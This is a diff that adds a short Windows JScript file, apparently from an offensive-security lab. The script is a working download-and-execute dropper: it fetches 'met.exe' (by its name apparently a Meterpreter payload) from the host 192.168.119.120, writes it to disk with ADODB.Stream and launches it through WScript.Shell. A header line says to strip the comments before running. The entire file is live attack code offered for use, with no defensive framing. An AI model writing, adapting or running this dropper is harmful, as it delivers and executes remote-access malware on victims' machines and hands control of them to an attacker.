@@ -1,0 +1,22 @@
+Remove the comments before running 
+
+/*
+	This script fetch the file from our server and execute on our window 
+*/
+
+var url = "http://192.168.119.120/met.exe"
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+Object.Open('GET', url, false); Object.Send();
+
+if (Object.Status == 200)
+{
+	var Stream = WScript.CreateObject('ADODB.Stream');
+	Stream.Open();
+	Stream.Type = 1; 
+	Stream.Write(Object.ResponseBody); 
+	Stream.Position = 0; // 1 is used to point to the beginning to the file 
+	Stream.SaveToFile("met.exe", 2); // 2 is used to force to overwrite 
+	Stream.Close(); 
+}
+
+var r = new ActiveXObject("WScript.Shell").Run("met.exe");
